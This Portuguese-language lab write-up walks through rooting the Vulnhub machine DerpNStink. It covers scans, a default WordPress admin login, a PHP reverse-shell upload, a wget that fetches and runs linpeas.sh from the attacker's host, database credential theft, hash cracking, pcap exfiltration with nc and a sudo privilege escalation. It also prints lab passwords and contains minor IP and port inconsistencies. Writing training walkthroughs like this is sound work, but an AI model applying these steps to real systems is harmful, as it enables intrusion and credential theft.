---
title: Vulnhub - DerpNStiNK
categories: [Vulnhub]
#tags: [Wordpress,MySQL]
render_with_liquid: false
image: https://0xch4rli3.github.io/assets/img/Vulnhub/DerpNStiNK/capa.png
---

![](/assets/img/Vulnhub/DerpNStiNK/capa.png)

Link da Maquina: <https://www.vulnhub.com/entry/derpnstink-1,221/>


# Scan/Enumeracao


## Host Discovery


* Com o arp-scan descobrimos que o nosso alvo esta no ip **192.168.150.118**

```bash
sudo arp-scan -I eth1 192.168.56.0/24
```

![](/assets/img/Vulnhub/DerpNStiNK/arp-scan.png)


## Port Discovery


* Com o parametro "-p-" do nmap varremos todas as portas possiveis do nosso alvo e encontramos 07 delas abertas. **22**, **53**, **80**, **110**, **139**, **143** e **445**

```bash
sudo nmap -n -T5 -p- 192.168.56.104
```

![](/assets/img/Vulnhub/DerpNStiNK/port-discovery.png)



## Port Scan


* Agora com o parametro "-A" do nmap vamos descobrir mais informacoes sobre essas portas abertas do nosso alvo

```bash
sudo nmap -n -T5 -A -p 21,22,80 192.168.56.104
```

![](/assets/img/Vulnhub/DerpNStiNK/port-scan.png)

> - Porta 21: vsftpd 3.0.2
> - Porta 22: OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
> - Porta 80: Apache httpd 2.4.7 ((Ubuntu))



# Enumeracao/Exploracao Web


* A primeira coisa a se fazer quando temos uma pagina web e entrar nela pelo browser, para realizar uma inspecao visual na mesma

![](/assets/img/Vulnhub/DerpNStiNK/web-principal.png)



* Seguindo a metodologia, vamos ver o que temos no codigo fonte da pagina. Temos uma chamada para um arquivo **info.txt**

![](/assets/img/Vulnhub/DerpNStiNK/codigo-fonte.png)


* Olhando o conteudo dele... temos uma informacao do Dev, ele pede pra atualizarmos o nosso arquivo **hosts** com o dns local do novo blog, para que possamos acessar ele...

![](/assets/img/Vulnhub/DerpNStiNK/comentario-infotxt-codigoFonte.png)

> - **<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->**



* Encontramos tambem uma flag no codigo fonte

![](/assets/img/Vulnhub/DerpNStiNK/flag1.png)


## Fuzzy de Diretorios - Gobuster


* Ja que nao temos mais nada na pagina, vamos fazer um fuzzy para ver o que podemos explorar. De todas os arquivos e diretorios que o gobuster nos retornou o mais interessante e o **/weblog**

```bash
gobuster dir -u http://192.168.56.104 -w /usr/share/wordlists/dirb/big.txt
```

![](/assets/img/Vulnhub/DerpNStiNK/gobuster-1.png)


* Tentando acessar a pagina pelo endereco ```192.168.56.104/weblog``` ele nos redireciona para o ```derpnstink.local/weblog```.


## Alterando o arquivo /etc/hosts

* Seguindo a dica do desenvolvedor vamos inserir no nosso arquivo hosts o dns da pagina

![](/assets/img/Vulnhub/DerpNStiNK/hosts-atualizacao.png)


## http://derpnstink.local/weblog/

* Conseguimos ter acesso ao blog...

![](/assets/img/Vulnhub/DerpNStiNK/derpnstink-weblog.png)



### Fuzzy de diretorios - Gobuster

* Agora que temos acesso ao WP vamos fazer um fuzzy de diretorios nele 

```bash
gobuster dir -u http://192.168.56.104/weblog -w /usr/share/wordlists/dirb/big.txt -x php
```

![](/assets/img/Vulnhub/DerpNStiNK/gobuster-2.png)


* Encontramos alguns arquivos e diretorios padrao do WordPress, dentre eles tem o /wp-login.php, com uma pagina de login


### Login WordPress

* Sempre que nos depararmos com paginas de login uma dica e sempre tentar as senhas obvias ou a senha padrao da aplicacao... e para a nossa surpresa conseguimos entrar na pagina de administracao do Wordpress com a credencial **admin:admin**

![](/assets/img/Vulnhub/DerpNStiNK/login-wordpress.png)

![](/assets/img/Vulnhub/DerpNStiNK/adm-wordpress.png)


### Explorando o WordPress

* Dentro do wordpress podemos inserir um payload em php para nos retornar o shell reverso

* Na pagina de administracao do WP vamos entrar na aba **Slideshow** -> **Manage Slides**, clicar em **Add New** e preencher alguns campos e inserir o nosso arquivo com o shell-code no lugar da imagem

![](/assets/img/Vulnhub/DerpNStiNK/inserindo-payload.png)

> - No kali tem alguns modelos de shell-codes em php disponiveis em /usr/share/webshells/php. 
> - Para essa maquina utilizamos o php-reverse-shell.php. Tem que lembrar de alterarar o IP
 

### Shell Reverso - www-data


* Apos ter criado um novo "slide" vamos clicar na imagem que foi carregada. Antes disso tem que deixar a porta escutando na kali

![](/assets/img/Vulnhub/DerpNStiNK/slide-charlie.png)


* Temos o shell do usuario **www-data**

![](/assets/img/Vulnhub/DerpNStiNK/shell-www-data.png)



# Usuario www-data

## Escalando Privilegio


* Seguindo a metodologia para escalar privilegio, verificamos se conseguimos executar comando com o sudo, mas sem sucesso. Entao vamos rodar o linpeas.sh para tentar achar alguma coisa que possa nos ajudar... Primeiro devemos baixar o linpeas no github e depois seguir os seguinte passos

```bash
sudo python3 -m http.server 80 #Na kali, para enviar o script linpeas para o alvo
wget 192.168.56.101/linpeas.sh #No alvo, para baixar o script
chmod +x lipeas.sh #No alvo, dar permissao de execucao para o script
./linpeas.sh #No alvo, executar o script
```

![](/assets/img/Vulnhub/DerpNStiNK/linpeas-sh.png)



* Conseguimos ver no resultado do linpeas os usuarios que podem logar na maquina. Poderiamos ver de outras formas, lendo o arquivo /etc/passwd, por exemplo...

![](/assets/img/Vulnhub/DerpNStiNK/linpeas-usuario.png)

> - root
> - mrderp
> - speech-dispacher
> - stinky


* Encontrando tambem as credenciais para entrar no bando de dados em **/var/www/html/weblog/wp-config.php**

![](/assets/img/Vulnhub/DerpNStiNK/linpeas-wpconfig.png)

> - **root:mysql**


### MySQL

* Vamos entrar no mysql com a credencial encontrada...

```bash
mysql -uroot -p
```

![](/assets/img/Vulnhub/DerpNStiNK/mysql-login.png)



* Vamos ver o que o banco tem de interessante. Temos alguns banco de dados, mas vamos acessar primeiramente o do wordpress...

```mysql
show databases;
use wordpress;
show tables;
select * from wp_users;
```

![](/assets/img/Vulnhub/DerpNStiNK/mysql-wp-users.png)

> - Encontramos na tabela **wp_users** o cadastro dos dois usuarios da aplicacao. Um deles e o que ja temos a senha, admin... O outro usuario e o **unclestinky**
> - Na coluna da senha tem um hash
> - **unclestinky:$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41**



### Hash-Identifier

* Vamos ver do que se trata esse hash

```bash
hash-identifier
```

![](/assets/img/Vulnhub/DerpNStiNK/hash-identifier.png)


* Conseguimos quebrar o hash da senha do usuario unclestinky, wedgie57. Entao agora temos outra credencial **unclestinky:wedgie57**

![](/assets/img/Vulnhub/DerpNStiNK/john-hash.png)



# Usuario Stinky

* Temos um usuario chamado "stinky" na maquina, ao verificar se ele reaproveitava a senha de outras aplicacoes para logar obtivemos sucesso e conseguimos entrar com o stinky

![](/assets/img/Vulnhub/DerpNStiNK/stink-login.png)


* Para deixar mais performatica a nossa iteracao com a maquina vamos tentar acessar via ssh, uma vez que temos a senha do usuario... Barro! Nao conseguimos acessar via ssh, entao vai na raca com o shell cachorro msm

![](/assets/img/Vulnhub/DerpNStiNK/ssh-negado.png)



## FTP

* Acessando o **/home/stinky** temos o diretorio do **ftp**

![](/assets/img/Vulnhub/DerpNStiNK/ftp.png)


* Vamos dar uma olhada no diretorio ssh... Conseguimos achar um arquivo **key.txt**

![](/assets/img/Vulnhub/DerpNStiNK/ftp-ssh-keyTXT.png)


* Parece que e uma chave privada...

![](/assets/img/Vulnhub/DerpNStiNK/ftp-key-txt.png)


* Tentamos logar nos usuarios com a chave mas nao conseguimos...


* Achamos o arquivo **derpissues.txt** dentro do diretorio **/network-logs**

![](/assets/img/Vulnhub/DerpNStiNK/ftp-networ-logs.png)

> - O arquivo e uma conversa entre os dois usuarios **stinky** e **mderp**, um deles fala que perdeu a senha e o outro diz para ele monitorar a rede. Provavelmente deve ter alfuma coisa em relacao a isso para podermos escalar privilegio...


## Flag - Stinky

* Varrendo os diretorios do /home do stinky encontramos um arquivo **flag.txt** no **Desktop**

![](/assets/img/Vulnhub/DerpNStiNK/flag-stinky.png)


## Wireshark

* No diretorio **Documents** temos um arquivo **derpissues.pcap**. Vamos transferir ele para a nossa maquina para analisarmos melhor...

![](/assets/img/Vulnhub/DerpNStiNK/derpissues-pcap.png)



* Para transferir deixamos uma porta escutando na nossa maquina e redirecionando o trafego para um arquivo .pcap. No alvo conectamos a essa porta da kali com o nc e direcionamos o arquivo para ela. Para tirar a prova real que o arquivo nao corrompeu tiramos o hash dele

![](/assets/img/Vulnhub/DerpNStiNK/transferencia-pcap.png)



* Carregamos o arquivo no wireshark e comecamos a analisar. Filtramos por pacotes TCP -> Clicamos com o botao direito em cima da captura -> Follow -> TCP Stream. Conseguimos ver o formulario passando a autenticacao do usucario **mderp**

![](/assets/img/Vulnhub/DerpNStiNK/wireshark-derp.png)

> - Conseguimos achar a credencial **mrderp:derpderpderpderpderpderpderp**


# Usuario - MrDerp


* Conseguimos fazer o login com o usuario **mrderp** com a credencial achada

![](/assets/img/Vulnhub/DerpNStiNK/login-mrderp.png)



* Verificamos os arquivos que conseguimos executar com o sudo

```bash
sudo -l
```

![](/assets/img/Vulnhub/DerpNStiNK/sudo-l-mrderp.png)

> - Podemos executar como sudo o que estiver no /home/mrderp/binaries/derpy*. Ou seja temos que criar um arquivo com esse nome...


# Root


* Primeiramente vamos criar um diretorio **binaries** pois nao tem ele originalemente...


* O proximo passo e fazer um script **derpy.sh**

![](/assets/img/Vulnhub/DerpNStiNK/derpy-sh.png)


* Agora e so dar permissao de execucao para o script, deixar a porta escutando na Kali e executar o script como sudo

![](/assets/img/Vulnhub/DerpNStiNK/shell-root.png)



# Flag Root

* Conseguimos escalar privilegio ate chegarmos ao ROOT e conseguimos pegar a flag

![](/assets/img/Vulnhub/DerpNStiNK/flag-root.png)


# Bonus

* **DAR UMA OLHADA NO MATERIAL QUE TA NO BLOG DO [0x4rt3mis](https://0x4rt3mis.github.io/vulnhub/oscp/2021/01/29/VulnHub-DerpNStink-1/) DESSA MAQUINA...**
